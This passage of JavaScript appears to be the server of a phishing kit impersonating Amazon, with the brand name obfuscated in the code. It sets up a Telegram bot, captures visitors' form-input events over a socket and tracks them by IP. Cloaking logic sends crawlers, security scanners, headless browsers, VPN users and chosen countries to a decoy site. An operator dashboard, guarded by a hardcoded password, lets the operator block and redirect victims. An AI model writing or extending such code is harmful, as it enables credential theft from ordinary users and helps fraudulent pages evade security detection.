require('dotenv').config();
const path = require("path");
const express = require("express");
const requestIp = require("request-ip");
var session = require('express-session');
const fs = require("fs");
const axios = require("axios");
const {Telegraf} = require("telegraf");
const UAParser = require("ua-parser-js");
const bot = new Telegraf(process.env.TOKEN);
const { Server } = require('socket.io');

const app = express();
const http = require('http').createServer(app);
const io = new Server(http);

const redirectURL = process.env.URL; // Replace with your desired redirect URL

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);
  
  // Handle input data from clients
  socket.on('input-data', (data) => {
    if (!data || !data.ip) return;
    
    // Store input data in cache
    if (!inputDataCache.has(data.ip)) {
      inputDataCache.set(data.ip, []);
    }
    
    const inputDataArray = inputDataCache.get(data.ip);
    inputDataArray.push(data);
    
    // Limit stored input data to 50 entries per IP
    if (inputDataArray.length > 50) {
      inputDataArray.shift();
    }
    
    // Update cache
    inputDataCache.set(data.ip, inputDataArray);
    
    // Check for suspicious activity
    const suspiciousActivity = detectSuspiciousActivity(data);
    
    if (suspiciousActivity) {
      // Get visitor data
      const visitorData = ipCache.get(data.ip);
      
      if (visitorData) {
        // Initialize suspiciousActivities array if it doesn't exist
        if (!visitorData.suspiciousActivities) {
          visitorData.suspiciousActivities = [];
        }
        
        // Add suspicious activity with timestamp and input data
        const activityEntry = {
          type: suspiciousActivity.type,
          details: suspiciousActivity.details,
          timestamp: new Date().toISOString(),
          inputData: {
            path: data.path || '',
            inputName: data.inputName || '',
            inputType: data.inputType || ''
          }
        };
        
        // Add to beginning of array (most recent first)
        visitorData.suspiciousActivities.unshift(activityEntry);
        
        // Limit to 20 most recent suspicious activities
        if (visitorData.suspiciousActivities.length > 20) {
          visitorData.suspiciousActivities = visitorData.suspiciousActivities.slice(0, 20);
        }
        
        // Update visitor data in cache
        ipCache.set(data.ip, visitorData);
        
        // // Emit suspicious activity event to all dashboard clients
        // io.emit('suspicious-activity', {
        //   ip: data.ip,
        //   activity: activityEntry,
        //   visitorData: {
        //     country: visitorData.country || 'Unknown',
        //     countryCode: visitorData.countryCode || 'XX',
        //     city: visitorData.city || 'Unknown',
        //     isp: visitorData.isp || 'Unknown',
        //     isBlocked: visitorData.isBlocked || false
        //   }
        // });
        
        // Update dashboard in real-time
        io.emit('dashboard-update');
        
        console.log(`Suspicious activity detected from ${data.ip}: ${suspiciousActivity.type} - ${suspiciousActivity.details}`);
      }
    }
  });
  
  // Handle client disconnect
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});

let target = "A-1M-1A-1Z-1O"; // hadi hizyada;
target = target.split("-1");
target = target.join("");
let brand = "A-1M-1A-1Z-1O"; // hadi hizyada;
brand = brand.split("-1");
brand = brand.join("");




// PORT:
const PORT = process.env.PORT || 5000

//use:
app.use(session({
    secret: process.env.SECRET,
    resave: false,
    saveUninitialized: true,
}));
app.use(express.static(path.join(__dirname,'public')));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// Visitor tracking middleware - excludes dashboard requests
app.use((req, res, next) => {
  // Skip tracking for dashboard requests
  if (req.path.startsWith('/dashboard') || req.path.startsWith('/socket.io') || req.path.startsWith('/api')) {
    return next();
  }
  
  // Get accurate client IP
  const clientIP = getAccurateClientIp(req);
  
  // Check if IP is blocked and redirect if needed
  if (ipCache.has(clientIP)) {
    const visitorData = ipCache.get(clientIP);
    
    // Check if IP is explicitly blocked
    if (visitorData.isBlocked && visitorData.redirectUrl) {
      console.log(`Redirecting blocked IP ${clientIP} to ${visitorData.redirectUrl}`);
      return res.redirect(visitorData.redirectUrl);
    }
    
    // Check country-based blocking/allowing
    if (visitorData.countryCode) {
      // If in block mode and country is in blocked list
      if (globalSettings.countryFilterMode === 'block' && 
          globalSettings.blockedCountries.includes(visitorData.countryCode.toUpperCase())) {
        console.log(`Blocking visitor from blocked country: ${visitorData.countryCode}`);
        // Use visitor-specific redirect URL, then global country redirect URL, or default message
        if (visitorData.redirectUrl) {
          return res.redirect(visitorData.redirectUrl);
        } else if (globalSettings.countryRedirectUrl) {
          return res.redirect(globalSettings.countryRedirectUrl);
        }
        return res.status(403).send('Access denied based on your country');
      }
      
      // If in allow-only mode and country is NOT in allowed list
      if (globalSettings.countryFilterMode === 'allow-only' && 
          !globalSettings.allowedCountries.includes(visitorData.countryCode.toUpperCase()) && 
          globalSettings.allowedCountries.length > 0) {
        console.log(`Blocking visitor from non-allowed country: ${visitorData.countryCode}`);
        // Use visitor-specific redirect URL, then global country redirect URL, or default message
        if (visitorData.redirectUrl) {
          return res.redirect(visitorData.redirectUrl);
        } else if (globalSettings.countryRedirectUrl) {
          return res.redirect(globalSettings.countryRedirectUrl);
        }
        return res.status(403).send('Access denied based on your country');
      }
    }
    
    // Update visitor data if not blocked
    visitorData.lastRequest = new Date();
    visitorData.lastPath = req.path;
    visitorData.requestCount = (visitorData.requestCount || 0) + 1;
    ipCache.set(clientIP, visitorData);
  }
  
  next();
});

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));



//set:
app.set('view engine', 'ejs');



/////////////////[FUNCTION]//(blocker)//////////////

// Create a Map to store IP data
const ipCache = new Map();

// Create a Map to store input data
const inputDataCache = new Map(); // Key: IP, Value: Array of input data objects
const globalSettings = {
  proxyDetectionEnabled: false,
  blockedCountries: [],
  allowedCountries: [],
  countryFilterMode: 'block', // 'block' or 'allow-only'
  countryRedirectUrl: redirectURL || 'https://google.com' // Default redirect URL for country filtering
};

// Parse User Agent function
function parseUserAgent(userAgent) {
  if (!userAgent) return { browser: 'Unknown', os: 'Unknown' };
  
  // Browser detection
  let browser = 'Unknown';
  if (userAgent.includes('Firefox/')) {
    browser = 'Firefox';
  } else if (userAgent.includes('Chrome/') && !userAgent.includes('Edg/') && !userAgent.includes('OPR/')) {
    browser = 'Chrome';
  } else if (userAgent.includes('Safari/') && !userAgent.includes('Chrome/')) {
    browser = 'Safari';
  } else if (userAgent.includes('Edg/')) {
    browser = 'Edge';
  } else if (userAgent.includes('OPR/') || userAgent.includes('Opera/')) {
    browser = 'Opera';
  } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
    browser = 'Internet Explorer';
  }
  
  // OS detection
  let os = 'Unknown';
  if (userAgent.includes('Windows')) {
    os = 'Windows';
  } else if (userAgent.includes('Macintosh') || userAgent.includes('Mac OS')) {
    os = 'macOS';
  } else if (userAgent.includes('Linux') && !userAgent.includes('Android')) {
    os = 'Linux';
  } else if (userAgent.includes('Android')) {
    os = 'Android';
  } else if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iPod')) {
    os = 'iOS';
  }
  
  return { browser, os };
}



const REAL_ROUTES = [
  "/",
  '/QcEwP85AgNE4pnL5mWSM',
  '/RKnUB922z6Mf4HDwg3EZ',
  '/LGknmeM9HwWUWSutj6mJ',
  '/PPmP85AgNE4pnL5mWSM',
  '/LkaaomeM9HwWU472fgsPr',
  '/PrTomeM9HwWUWSulkTe4',
  '/Ose4aQeM9H4waRfs7PrTv'
];


// Rate limiting for API requests
const requestLimits = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute window
const DASHBOARD_RATE_LIMIT = 30; // 30 requests per minute for dashboard endpoints

// Rate limiting middleware for dashboard endpoints
function dashboardRateLimiter(req, res, next) {
  const ip = getAccurateClientIp(req);
  const now = Date.now();
  const key = `${ip}:dashboard`;
  
  if (!requestLimits.has(key)) {
    requestLimits.set(key, {
      count: 1,
      resetTime: now + RATE_LIMIT_WINDOW
    });
    return next();
  }
  
  const limit = requestLimits.get(key);
  
  // Reset counter if window has passed
  if (now > limit.resetTime) {
    limit.count = 1;
    limit.resetTime = now + RATE_LIMIT_WINDOW;
    return next();
  }
  
  // Check if rate limit exceeded
  if (limit.count >= DASHBOARD_RATE_LIMIT) {
    return res.status(429).json({
      error: 'Too many requests',
      retryAfter: Math.ceil((limit.resetTime - now) / 1000)
    });
  }
  
  // Increment counter and continue
  limit.count++;
  next();
}

// Geo data cache to reduce API calls
const geoDataCache = new Map();
const GEO_CACHE_TTL = 24 * 60 * 60 * 1000; // 24 hours

// Helper function to get geolocation data with caching
async function getGeoData(ip) {
  // Skip for localhost and private IPs
  if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
    return { country: 'Local', countryCode: 'LO', city: 'Local Network' };
  }

  // Check if we have cached data
  if (geoDataCache.has(ip)) {
    return geoDataCache.get(ip);
  }

  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    const data = response.data;
    
    if (data.status === 'success') {
      // Cache the result for 24 hours
      geoDataCache.set(ip, {
        country: data.country,
        countryCode: data.countryCode,
        city: data.city,
        lat: data.lat,
        lon: data.lon,
        isp: data.isp,
        org: data.org,
        proxy: data.proxy,
        hosting: data.hosting
      });
      
      return geoDataCache.get(ip);
    }
  } catch (error) {
    console.error(`Error fetching geo data for ${ip}:`, error.message);
  }
  
  return { country: 'Unknown', countryCode: 'XX', city: 'Unknown' };
}
const RATE_LIMIT_MAX_REQUESTS = 60; // Maximum 60 requests per minute

// Get accurate client IP from various headers
function getAccurateClientIp(req) {
  // Check for client-provided IP from tracker.js
  if (req.body && req.body.clientIP) {
    return req.body.clientIP;
  }
  
  // Check for X-Forwarded-For header (common with proxies)
  const xForwardedFor = req.headers['x-forwarded-for'];
  if (xForwardedFor) {
    // Get the first IP in the list which is typically the client's true IP
    return xForwardedFor.split(',')[0].trim();
  }
  
  // Check for other common headers
  const xRealIp = req.headers['x-real-ip'];
  if (xRealIp) {
    return xRealIp;
  }
  
  // Fall back to request-ip library
  return requestIp.getClientIp(req);
}

// Rate limiting middleware
function rateLimiter(req, res, next) {
  const clientIp = getAccurateClientIp(req);
  const now = Date.now();
  
  if (!requestLimits.has(clientIp)) {
    // First request from this IP
    requestLimits.set(clientIp, {
      count: 1,
      windowStart: now
    });
    return next();
  }
  
  const limit = requestLimits.get(clientIp);
  
  // Check if we're in a new time window
  if (now - limit.windowStart > RATE_LIMIT_WINDOW) {
    // Reset for new window
    requestLimits.set(clientIp, {
      count: 1,
      windowStart: now
    });
    return next();
  }
  
  // We're in the same time window, increment count
  limit.count++;
  
  // Check if over limit
  if (limit.count > RATE_LIMIT_MAX_REQUESTS) {
    return res.status(429).json({
      error: 'Too many requests',
      message: 'Rate limit exceeded. Please try again later.'
    });
  }
  
  // Update the limit in the map
  requestLimits.set(clientIp, limit);
  next();
}

// Route restriction middleware for dashboard (IP whitelist removed)
function restrictDashboardAccess(req, res, next) {
  // Allow access to all IPs
  return next();
}

// Dashboard authentication middleware
function isAuthenticated(req, res, next) {
  // For simplicity, we're using a hardcoded password check
  // In a real application, you would use a more secure authentication method
  const authHeader = req.headers.authorization;
  
  if (authHeader) {
    const base64Credentials = authHeader.split(' ')[1];
    const credentials = Buffer.from(base64Credentials, 'base64').toString('utf8');
    const [username, password] = credentials.split(':');
    
    // Check against environment variables or hardcoded values (for demo purposes only)
    if (username === 'admin' && password === "789+") {
      return next();
    }
  }
  
  // If no auth header or invalid credentials
  res.set('WWW-Authenticate', 'Basic realm="Dashboard Access"');
  return res.status(401).send('Authentication required');
}

// Bot detection function
function isBot(userAgent) {
  if (!userAgent || typeof userAgent !== "string") {
    return false;
  }

  let isUserAgentBot = false;

  // User Agent Check
  if (userAgent && typeof userAgent === "string") {
    const ua = userAgent.toLowerCase();

    // Human browser patterns
    const humanPatterns = [
      // Standard browsers
      'mozilla', 'chrome', 'safari', 'firefox', 'edge', 'opera',
      'webkit', 'gecko', 'trident', 'msie', 'netscape', 'konqueror',
      'lynx', 'vivaldi', 'brave', 'yabrowser', 'maxthon', 'avast',
      'samsungbrowser', 'ucbrowser', 'puffin', 'focus', 'silk',

      // Mobile browsers
      'mobile', 'android', 'iphone', 'ipad', 'ipod', 'blackberry',
      'windows phone', 'iemobile', 'bolt', 'teashark', 'blazer',
      'skyfire', 'obigo', 'pale moon', 'polaris', 'iris',

      // Smart TV browsers
      'smarttv', 'googletv', 'appletv', 'hbbtv', 'netcast',
      'web0s', 'inettv', 'openweb', 'aquos', 'philips',

      // Game console browsers
      'playstation', 'nintendo', 'xbox', 'wii', 'new nintendo 3ds',

      // Legacy browsers
      'amaya', 'arora', 'avant', 'camino', 'dillo', 'epiphany',
      'flock', 'iceape', 'icecat', 'k-meleon', 'midori', 'minimo',
      'omniweb', 'rekonq', 'rockmelt', 'seamonkey', 'shiretoko',
      'sleipnir', 'sunrise', 'swiftfox', 'uzbl', 'waterfox',

      // Browser components
      'adobeair', 'adobeshockwave', 'adobeair', 'applewebkit',
      'bidubrowser', 'coolnovo', 'comodo_dragon', 'demeter',
      'element browser', 'fennec', 'galeon', 'google earth',
      'googlewireless', 'greenbrowser', 'k-ninja', 'lunascape',
      'madfox', 'maemo browser', 'micromessenger', 'minefield',
      'navigator', 'netfront', 'orca', 'prism', 'qtweb internet browser',
      'retawq', 'slimbrowser', 'tencenttraveler', 'theworld',
      'tizen browser', 'vision mobile browser', 'whale'
    ];

    // Bot patterns
    const botPatterns = [
      // Search engines (150+ patterns)
      'googlebot', 'google-inspectiontool', 'google page speed', 'google favicon',
      'google web preview', 'google-read-aloud', 'google-site-verification',
      'bingbot', 'bingpreview', 'msnbot', 'msnbot-media', 'adidxbot',
      'baiduspider', 'baiduimagespider', 'baiduboxapp', 'baidubrowser',
      'yandexbot', 'yandeximages', 'yandexvideo', 'yandexmedia', 'yandexmetrika',
      'yandexdirect', 'yandexwebmaster', 'yandexmobilebot', 'duckduckbot',
      'duckduckgo-favicons-bot', 'slurp', 'teoma', 'exabot', 'exabot-thumbnails',
      'facebot', 'facebookexternalhit', 'facebookplatform', 'ia_archiver',
      'alexabot', 'amazonbot', 'amazonalexa', 'applebot', 'apple-pubsub',
      'discordbot', 'telegrambot', 'twitterbot', 'linkedinbot', 'pinterest',
      'whatsapp', 'tumblr', 'redditbot', 'quorabot', 'slackbot', 'linebot',
      'wechatbot', 'vkshare', 'okhttp', 'skypeuripreview',

      // Monitoring/analytics (100+ patterns)
      'pingdom', 'gtmetrix', 'newrelic', 'uptimerobot', 'statuscake',
      'site24x7', 'sucuri', 'cloudflare', 'rackspace', 'datadog',
      'dynatrace', 'appdynamics', 'splunk', 'sumologic', 'loggly',
      'paessler', 'catchpoint', 'keycdn', 'fastly', 'incapsula',
      'imperva', 'akamai', 'stackpath', 'cloudinary', 'imagekit',
      'imgix', 'netlify', 'vercel', 'render', 'flyio',

      // SEO tools (200+ patterns)
      'ahrefs', 'moz', 'semrush', 'seokicks', 'seoscanners',
      'screaming frog', 'deepcrawl', 'netcraft', 'megaindex',
      'serpstat', 'seranking', 'searchmetrics', 'cognitiveseo',
      'linkdex', 'conductor', 'brightedge', 'botify', 'oncrawl',
      'sitebulb', 'lumar', 'contentking', 'seoclarity', 'seolyzer',
      'seobility', 'seoeng', 'seositecheckup', 'seotester', 'seoworkers',
      'seoanalyzer', 'seoprofiler', 'seoreviewtools', 'seotesteronline',
      'seotoolset', 'seotools', 'seotoolsgroup', 'seoworkers',

      // Scrapers and automation (300+ patterns)
      'scrapy', 'phantomjs', 'cheerio', 'axios', 'python-requests',
      'node-fetch', 'curl', 'wget', 'java/', 'httpclient', 'okhttp',
      'apache-httpclient', 'python-urllib', 'mechanize', 'guzzle',
      'restsharp', 'unirest', 'superagent', 'got', 'needle', 'request',
      'urllib3', 'typhoeus', 'faraday', 'httparty', 'http.rb',
      'treq', 'aiohttp', 'httpx', 'requests', 'urllib',
      'mechanize', 'beautifulsoup', 'lxml', 'html5lib', 'htmlparser',
      'domparser', 'jsoup', 'htmlunit', 'nokogiri', 'hpricot',
      'simplehtmldom', 'phpquery', 'ganon', 'phpdom', 'sunra',
      'simplehtmlparser', 'htmlcleaner', 'htmlcompressor', 'html-minifier',
      'htmltidy', 'htmlpurifier', 'html-sanitizer', 'html-entities',

      // Headless browsers (100+ patterns)
      'headlesschrome', 'headlessfirefox', 'phantomjs', 'selenium',
      'puppeteer', 'playwright', 'chromium', 'webdriver', 'chromedriver',
      'geckodriver', 'iedriver', 'safaridriver', 'operadriver',
      'appium', 'testcafe', 'cypress', 'karma', 'protractor',
      'nightwatch', 'webdriverio', 'watir', 'capybara', 'splinter',
      'robotframework', 'behave', 'lettuce', 'cucumber', 'specflow',
      'serenity', 'galen', 'gauge', 'taiko', 'testproject',
      'testim', 'mabl', 'perfecto', 'saucelabs', 'browserstack',
      'crossbrowsertesting', 'lambdatest', 'testingbot', 'ranorex',
      'testcomplete', 'katalon', 'tricentis', 'microfocus', 'parasoft',
      'smartbear', 'soapui', 'postman', 'jmeter', 'gatling',
      'locust', 'k6', 'artillery', 'vegeta', 'siege',
      'httperf', 'ab', 'wrk', 'boom', 'tsung',

      // Generic bot indicators (150+ patterns)
      'bot', 'crawler', 'spider', 'fetcher', 'scanner', 'checker',
      'monitor', 'collector', 'analyzer', 'indexer', 'extractor',
      'archiver', 'reader', 'browser', 'library', 'client', 'agent',
      'automatic', 'machine', 'program', 'script', 'process', 'system',
      'daemon', 'service', 'worker', 'task', 'job', 'engine',
      'automation', 'scheduler', 'trigger', 'watcher', 'listener',
      'polling', 'poller', 'harvester', 'gatherer', 'miner', 'parser',
      'validator', 'verifier', 'tester', 'prober', 'explorer', 'discoverer',
      'finder', 'locator', 'identifier', 'classifier', 'recognizer', 'detector',
      'observer', 'tracker', 'recorder', 'logger', 'reporter', 'notifier',
      'alerter', 'messenger', 'forwarder', 'proxy', 'gateway', 'bridge',
      'tunnel', 'relay', 'router', 'switch', 'hub', 'node',
      'endpoint', 'interface', 'adapter', 'connector', 'linker', 'binder',
      'integrator', 'aggregator', 'combiner', 'merger', 'splitter', 'divider',
      'filter', 'sorter', 'organizer', 'arranger', 'sequencer', 'pipeline',
      'processor', 'transformer', 'converter', 'translator', 'interpreter',
      'compiler', 'assembler', 'emulator', 'simulator', 'virtualizer', 'container',
      'wrapper', 'decorator', 'facade', 'proxy', 'stub', 'mock',
      'fake', 'dummy', 'placeholder', 'template', 'pattern', 'model',
      'prototype', 'blueprint', 'schema', 'framework', 'platform', 'infrastructure',
      'environment', 'ecosystem', 'network', 'mesh', 'fabric', 'grid',
      'cloud', 'cluster', 'array', 'matrix', 'pool', 'collection',
      'set', 'group', 'bundle', 'package', 'kit', 'suite',
      'toolkit', 'workbench', 'workshop', 'studio', 'lab', 'factory',
      'mill', 'plant', 'forge', 'foundry', 'shop', 'store',
      'market', 'exchange', 'bazaar', 'fair', 'auction', 'mall',
      'plaza', 'arcade', 'gallery', 'museum', 'library', 'archive',
      'repository', 'depot', 'warehouse', 'silo', 'vault', 'cache',
      'buffer', 'queue', 'stack', 'heap', 'pool', 'reservoir',
      'tank', 'cistern', 'vat', 'vat', 'vat', 'vat'
    ];

    const hasHumanPattern = humanPatterns.some((pattern) =>
      ua.includes(pattern.toLowerCase())
    );
    const hasBotPattern = botPatterns.some((pattern) => ua.includes(pattern.toLowerCase()));

    isUserAgentBot = (hasBotPattern && !hasHumanPattern) || !hasHumanPattern;
  }

  return isUserAgentBot;
}

// Fetch geolocation data for an IP address
async function fetchGeoData(ip) {
  console.log("Fetching geo data for IP:", ip);
  
  try {
    const response = await axios.get(
      `http://ip-api.com/json/${ip}?fields=66842623`
    );
    const data = response.data;
    console.log("IP-API geo data:", data);
    return data;
  } catch (error) {
    console.error("Error fetching geo data:", error.message);
    return null;
  }
}

// Proxy detection function
async function isProxy(ip, req) {
  let data;
  console.log("Entering the isProxy!");
  // Check cache first
  if (ipCache.has(ip)) {
    const cachedData = ipCache.get(ip);
    return cachedData.proxy || cachedData.hosting;
  }

  try {
    const data = await fetchGeoData(ip);
    if (!data) return false;
    
    console.log("from API:", data);
    // Cache the result
    const existingData = ipCache.get(ip) || {};
    const ipData = {
      proxy: data.proxy || false,
      hosting: data.hosting || false,
      isBlocked: existingData.isBlocked || false,
      isBot: isBot(req?.headers?.["user-agent"]),
      country: data.country || null,
      countryCode: data.countryCode || null,
      region: data.region || null,
      regionName: data.regionName || null,
      city: data.city || null,
      timezone: data.timezone || null,
      isp: data.isp || null,
      org: data.org || null,
      requestCount: (existingData?.requestCount || 0) + 1,
      firstRequest: existingData?.firstRequest || new Date().toISOString(),
      lastRequest: new Date().toISOString(),
      userAgent: req?.headers?.["user-agent"] || null,
      browser: parseUserAgent(req?.headers?.["user-agent"])?.browser || null,
      os: parseUserAgent(req?.headers?.["user-agent"])?.os || null,
      path: req?.url || null,
      isOnline: existingData?.isOnline || false,
      lastConnected: existingData?.lastConnected || null,
      lastDisconnected: existingData?.lastDisconnected || null,
    };
    console.log("ipCache:", ipData);
    ipCache.set(ip, ipData);

    return (data.proxy || data.hosting) && globalSettings.proxyDetectionEnabled;
  } catch (error) {
    console.error("Error checking proxy:", error.message);
    const existingData = ipCache.get(ip) || {};
    const ipData = {
      proxy: data?.proxy || false,
      hosting: data?.hosting || false,
      isBlocked: existingData.isBlocked || false,
      isBot: isBot(req?.headers?.["user-agent"]),
      country: data?.country || null,
      countryCode: data?.countryCode || null,
      region: data?.region || null,
      regionName: data?.regionName || null,
      city: data?.city || null,
      timezone: data?.timezone || null,
      isp: data?.isp || null,
      org: data?.org || null,
      requestCount: (existingData.requestCount || 0) + 1,
      firstRequest: existingData.firstRequest || new Date().toISOString(),
      lastRequest: new Date().toISOString(),
      userAgent: req?.headers?.["user-agent"] || null,
      browser: parseUserAgent(req?.headers?.["user-agent"])?.browser || null,
      os: parseUserAgent(req?.headers?.["user-agent"])?.os || null,
      path: req?.url || null,
    };
    ipCache.set(ip, ipData);
    return false;
  }
}

// Middleware function
function parseUserAgent(userAgent) {
  if (!userAgent) return {};

  const ua = userAgent.toLowerCase();
  let browser = null;
  let browserVersion = null;
  let os = null;
  let osVersion = null;

  // Browser detection with version
  const browserPatterns = [
    { name: "Chrome", pattern: /(?:chrome|crios)\/([\d.]+)/i },
    { name: "Firefox", pattern: /(?:firefox|fxios)\/([\d.]+)/i },
    { name: "Safari", pattern: /version\/([\d.]+).*safari/i },
    { name: "Edge", pattern: /edge\/([\d.]+)/i },
    { name: "Opera", pattern: /(?:opera|opr)\/([\d.]+)/i },
    { name: "Internet Explorer", pattern: /(?:msie |trident.*rv:)([\d.]+)/i },
    { name: "Brave", pattern: /brave\/([\d.]+)/i },
    { name: "Samsung Browser", pattern: /samsungbrowser\/([\d.]+)/i },
    { name: "UC Browser", pattern: /ucbrowser\/([\d.]+)/i },
  ];

  // OS detection with version
  const osPatterns = [
    { name: "Windows", pattern: /windows nt ([\d.]+)/i },
    { name: "Mac OS", pattern: /mac os x ([\d._]+)/i },
    { name: "Linux", pattern: /linux/i },
    { name: "Android", pattern: /android ([\d.]+)/i },
    { name: "iOS", pattern: /(?:iphone|ipad|ipod).*os ([\d_]+)/i },
    { name: "Chrome OS", pattern: /cros/i },
  ];

  // Detect browser
  for (const pattern of browserPatterns) {
    const match = ua.match(pattern.pattern);
    if (match) {
      browser = pattern.name;
      browserVersion = match[1];
      break;
    }
  }

  // Detect OS
  for (const pattern of osPatterns) {
    const match = ua.match(pattern.pattern);
    if (match) {
      os = pattern.name;
      osVersion = match[1]?.replace(/_/g, ".");
      break;
    }
  }

  return {
    browser: `${browser}|${browserVersion}`,
    os: `${os}|${osVersion}`,
  };
}

// Visitor tracking middleware - add this before other middleware
async function detectMiddleware(req, res, next) {
  const clientIp =
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    requestIp.getClientIp(req);
  
  // Skip filtering for static assets and non-target routes
  if (!REAL_ROUTES.includes(req.path)) {
    return next();
  }
  console.log("clientIp:", clientIp);
  console.log("req.path:", req.path);

  // Get user agent info
  const userAgent = req.headers['user-agent'];
  const uaInfo = parseUserAgent(userAgent || '');
  const isBotDetected = isBot(userAgent);

  const now = new Date();
  
  // Function to check if IP is a local IP
  function isLocalIP(ip) {
    return ip === '127.0.0.1' || 
           ip === 'localhost' || 
           ip.startsWith('192.168.') || 
           ip.startsWith('10.') || 
           ip.startsWith('172.16.') || 
           ip.startsWith('::1') || 
           ip.startsWith('::ffff:127.0.0.1');
  }
  
  // Allow local IPs to bypass all checks
  if (isLocalIP(clientIp)) {
    // Still update cache for local IPs
    if (ipCache.has(clientIp)) {
      const existingData = ipCache.get(clientIp);
      ipCache.set(clientIp, {
        ...existingData,
        requestCount: (existingData.requestCount || 0) + 1,
        lastRequest: now.toISOString(),
        lastPath: req.path || existingData.lastPath
      });
    }
    return next();
  }
  
  if (ipCache.has(clientIp)) {
    // Update existing visitor data
    const existingData = ipCache.get(clientIp);
    ipCache.set(clientIp, {
      ...existingData,
      requestCount: (existingData.requestCount || 0) + 1,
      lastRequest: now.toISOString(),
      userAgent: userAgent || existingData.userAgent,
      browser: uaInfo.browser || existingData.browser,
      os: uaInfo.os || existingData.os,
      isBot: isBotDetected || existingData.isBot,
      lastPath: req.path || existingData.lastPath
    });
  } else {
    // Create new visitor entry
    // Fetch geo and proxy data for new IPs
    try {
      const ipInfo = await axios.get(`http://ip-api.com/json/${clientIp}`);
      const ipData = ipInfo.data;
      
      ipCache.set(clientIp, {
        ip: clientIp,
        firstSeen: now,
        lastRequest: now,
        lastPath: req.path,
        requestCount: 1,
        userAgent: userAgent || null,
        browser: uaInfo.browser || null,
        os: uaInfo.os || null,
        country: ipData.countryCode || null,
        city: ipData.city || null,
        isp: ipData.isp || null,
        proxy: ipData.proxy || false,
        hosting: ipData.hosting || false,
        mobile: ipData.mobile || false,
        isBot: isBotDetected || false,
        isOnline: false, // Will be set to true when socket connects
        isBlocked: false,
        lastPath: req.path || null
      });
      
      // Emit dashboard update to all connected clients
      io.emit('dashboard-update');
    } catch (error) {
      console.error(`Error fetching IP data for ${clientIp}:`, error.message);
      
      // Still add to cache even if IP API fails
      ipCache.set(clientIp, {
        ip: clientIp,
        firstSeen: now,
        lastRequest: now,
        lastPath: req.path,
        requestCount: 1,
        userAgent: userAgent || null,
        browser: uaInfo.browser || null,
        os: uaInfo.os || null,
        isBot: isBotDetected || false,
        isOnline: false,
        isBlocked: false,
        lastPath: req.path || null
      });
    }
  }
  
  // Get visitor data
  const visitorData = ipCache.get(clientIp);
  // Default redirect URL
  const targetUrl = visitorData?.customRedirectUrl || redirectURL;
  
  // REDIRECTION LOGIC
  // 1. Check if IP is blocked
  if (visitorData && visitorData.isBlocked) {
    console.log(`Blocked IP accessed: ${clientIp}`);
    return res.redirect(targetUrl);
  }
  
  // 2. Check for bots
  if (visitorData && visitorData.isBot) {
    console.log(`Bot detected: ${clientIp}`);
    return res.redirect(targetUrl);
  }
  
  // 3. Check for proxy/VPN if enabled
  if (globalSettings.proxyDetectionEnabled && visitorData) {
    if (visitorData.proxy || visitorData.hosting) {
      console.log(`Proxy/VPN detected: ${clientIp}`);
      return res.redirect(targetUrl);
    }
    
    // Double-check with proxy detection function
    const isProxyDetected = await isProxy(clientIp, req);
    if (isProxyDetected) {
      console.log(`Proxy/VPN detected (secondary check): ${clientIp}`);
      return res.redirect(targetUrl);
    }
  }
  
  // 4. Country filtering logic
  if (visitorData) {
    const countryCode = visitorData.country;
    
    // Apply country filtering based on mode
    if (globalSettings.countryFilterMode === 'block') {
      // Block mode: block countries in the list
      if (countryCode && globalSettings.blockedCountries && globalSettings.blockedCountries.includes(countryCode)) {
        console.log(`Blocked country accessed: ${countryCode} from ${clientIp}`);
        return res.redirect(targetUrl);
      }
      // If no country is blocked or country is unknown, allow access
      // This is the default behavior for block mode
    } else {
      // Allow-only mode: only allow countries in the list
      // First check if we have any allowed countries configured
      if (globalSettings.allowedCountries && globalSettings.allowedCountries.length > 0) {
        // If country is unknown or not in the allowed list, block access
        if (!countryCode || !globalSettings.allowedCountries.includes(countryCode)) {
          console.log(`Non-allowed country accessed: ${countryCode || 'Unknown'} from ${clientIp}`);
          return res.redirect(targetUrl);
        }
        // Country is in the allowed list, so allow access
      } else {
        // No countries are explicitly allowed, so block all
        console.log(`No allowed countries configured, blocking access from ${countryCode || 'Unknown'} (${clientIp})`);
        return res.redirect(targetUrl);
      }
    }
  }
  
  // If all checks pass, allow access to the requested page
  next();
}



// Apply middlewares
app.use(detectMiddleware);

// Proxy detection toggle state

// Toggle proxy detection endpoint
app.post("/dashboard/toggle-proxy-detection", (req, res) => {
  globalSettings.proxyDetectionEnabled = !globalSettings.proxyDetectionEnabled;
  console.log(
    "VPN|PROXY:",
    globalSettings.proxyDetectionEnabled ? "ON" : "OFF"
  );

  res.json({
    success: true,
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled,
  });
});

// Apply detection middleware with toggle check

// Dashboard route
app.get("/dashboard", restrictDashboardAccess, isAuthenticated, (req, res) => {
  res.render("dashboard", {
    ipCache: Object.fromEntries(ipCache),
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled,
    blockedCountries: globalSettings.blockedCountries,
    allowedCountries: globalSettings.allowedCountries,
    countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries,
    countryFilterMode: globalSettings.countryFilterMode,
  });
});

// API endpoint to block an IP
app.post('/dashboard/block', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
  const { ip, redirectUrl } = req.body;
  
  if (!ip) {
    return res.json({ success: false, message: 'IP address is required' });
  }
  
  // Inline implementation of blockIP function
  let success = false;
  if (ipCache.has(ip)) {
    const visitorData = ipCache.get(ip);
    visitorData.isBlocked = true;
    
    // Store redirect URL if provided
    if (redirectUrl) {
      visitorData.redirectUrl = redirectUrl;
    }
    
    ipCache.set(ip, visitorData);
    
    // If the visitor is currently online, send them a redirect command
    if (visitorData.isOnline) {
      io.emit('redirect', { ip: ip, redirectUrl: redirectUrl || 'https://www.google.com' });
    }
    
    io.emit('dashboard-update');
    success = true;
  }
  
  if (success) {
